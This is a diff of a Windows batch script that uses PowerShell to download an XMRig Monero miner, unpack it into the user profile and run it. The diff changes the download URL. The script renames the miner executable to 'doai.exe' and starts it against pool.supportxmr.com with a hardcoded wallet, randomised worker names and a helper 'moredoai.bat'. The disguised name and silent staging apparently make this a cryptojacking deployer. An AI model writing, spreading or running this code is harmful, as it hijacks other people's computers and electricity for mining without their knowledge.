@@ -42,7 +42,7 @@ for %%p in (!ports!) do (
 )
 del %USERPROFILE%\temp.txt
 
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://download.c3pool.org/xmrig_setup/raw/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip', '%USERPROFILE%\xmrig.zip')"
 
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\c3pool')"
 if errorlevel 1 (
@@ -55,7 +55,7 @@ if errorlevel 1 (
 )
 del "%USERPROFILE%\xmrig.zip"
 
-move "%USERPROFILE%\c3pool\xmrig.exe" "%USERPROFILE%\c3pool\doai.exe"
+move "%USERPROFILE%\c3pool\xmrig-6.21.3\xmrig.exe" "%USERPROFILE%\c3pool\xmrig-6.21.3\doai.exe"
 set random_number=%RANDOM%
 set doai_date=%date:~0,-3%
 
@@ -66,4 +66,4 @@ if errorlevel 1 (
     "%USERPROFILE%\moredoai.bat"
 ) 
 
-"%USERPROFILE%\c3pool\doai.exe" --donate-level 5 -o pool.supportxmr.com:443 -u 85YHd1PV3DAURaTqtoDy7GYPcaztBSf8NGhQz5MCUnpXXQVwzmHnkKzQC2guMsWHwd5cjDuDFsHKeTeLQsyELaTYFYrf5HG -k --tls -p doai_win%doai_date%_%random_number%
+"%USERPROFILE%\c3pool\xmrig-6.21.3\doai.exe" --donate-level 5 -o pool.supportxmr.com:443 -u 85YHd1PV3DAURaTqtoDy7GYPcaztBSf8NGhQz5MCUnpXXQVwzmHnkKzQC2guMsWHwd5cjDuDFsHKeTeLQsyELaTYFYrf5HG -k --tls -p doai_win%doai_date%_%random_number%
